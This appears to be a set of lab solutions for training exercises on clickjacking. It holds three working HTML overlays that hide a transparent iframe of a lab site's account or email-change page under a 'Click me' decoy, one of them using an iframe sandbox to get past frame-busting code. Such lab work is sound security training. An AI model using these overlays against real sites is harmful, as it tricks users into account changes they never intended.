## Clickjacking

### Basic clickjacking with CSRF token protection

TODO
```html
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.0000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:310px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://acb51fbc1faf3227801a430500410078.web-security-academy.net/account"></iframe>
```

### Clickjacking with form input data prefilled from a URL parameter

```html
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:420px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://aca41f091f5bb2d980ee3bc400f600de.web-security-academy.net/email?email=foo@bar.com"></iframe>
```

### Clickjacking with a frame buster script

```html
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:400px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://ac541f331f3b3af8801a0f9a009f0035.web-security-academy.net/email?email=foo@bar.com"></iframe>
```
